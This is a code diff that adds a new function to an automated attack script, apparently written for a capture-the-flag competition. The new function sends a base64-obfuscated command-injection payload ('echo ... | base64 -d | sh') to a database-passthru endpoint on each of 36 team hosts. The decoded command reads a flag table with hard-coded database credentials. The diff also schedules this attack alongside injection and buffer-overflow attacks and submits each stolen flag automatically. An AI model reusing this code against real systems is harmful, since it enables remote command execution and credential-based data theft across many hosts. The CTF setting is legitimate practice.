@@ -87,7 +87,37 @@ var pmcDBPassthru = function (team) {
     req.end();
 }
 
+//
+//  PMC db passthru echo
+//
 
+var pmcDBPassthruEchoRegex = /flag\s*(\w+)/
+var pmcDBPassthruEcho = function (team) {
+    var url = "http://10.8." + team.toString() + '.100:7788/menu.php/db/passthru/echo+-n+"bXlzcWwgLUQgcG1jIC11IGpveSAtcGNoYW5zZXkgLWUgInNlbGVjdCBmbGFnIGZyb20gZmxhZyI%3D"+%7C+base64+-d+%7C+sh+2>%261';
+    var req = http.request(url, function (res) {
+        res.setEncoding('utf8');
+        res.on('data', function (data) {
+            flag = parseFlag(pmcDBPassthruEchoRegex, data)
+            if (flag) {
+                console.log('FLAG: '.yellow, team, flag);
+                submit(flag);
+                req.destroy();
+            }
+        });
+
+    });
+    req.on('error', function(e) {
+        console.log('ERROR: '.red + e.message);
+        req.destroy();
+    });
+    req.setTimeout(10000, function () {
+        console.log('TIMEOUT: '.red);
+        req.destroy();
+    });
+    req.end();
+}
+
+//
 //
 //  SSP login buffer overflow Attack
 //
@@ -127,10 +157,10 @@ var attackAll = function () {
     for (i = 0; i < 36; i++) {
         pmcNameSearchInjection(i);
         pmcDBPassthru(i);
+        pmcDBPassthruEcho(i);
         sspLoginBufferOverflow(i);
     }
 };
-
 // main
 var rule = new schedule.RecurrenceRule();
 rule.minute = 0;
